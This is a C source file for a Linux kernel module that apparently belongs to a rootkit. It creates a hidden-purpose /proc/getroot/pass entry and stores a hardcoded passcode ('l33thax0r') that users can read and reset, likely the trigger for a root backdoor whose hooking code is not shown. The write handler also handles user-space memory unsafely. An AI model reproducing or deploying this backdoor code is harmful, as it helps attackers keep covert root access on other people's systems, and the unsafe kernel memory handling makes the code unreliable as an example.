#include "proc_hook.h"

static char passcode[100] = "l33thax0r";

struct proc_dir_entry *my_dir; 
struct proc_dir_entry *conf_file;

void init_proc()
{
	P_DEBUG("Creating proc_entries\n");
	my_dir = proc_mkdir("getroot", &proc_root);
	if(my_dir) {
		conf_file = create_proc_entry("pass", 0600, my_dir);
		conf_file->owner = THIS_MODULE;
		conf_file->write_proc = conf_write;
		conf_file->read_proc  = conf_read;
	}
}

void restore_proc()
{
	P_DEBUG("Destroying proc_entries\n");
	remove_proc_entry(my_dir->name, &proc_root);
}

int conf_read(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
	return sprintf(buf, "Current passcode: %s\n", passcode);
}

int conf_write(struct file *file, const char *buf, unsigned long count, void *data)
{
	memset(passcode, 0, 100);
	strncpy(passcode, buf, 99);	
	return strlen(buf);
}
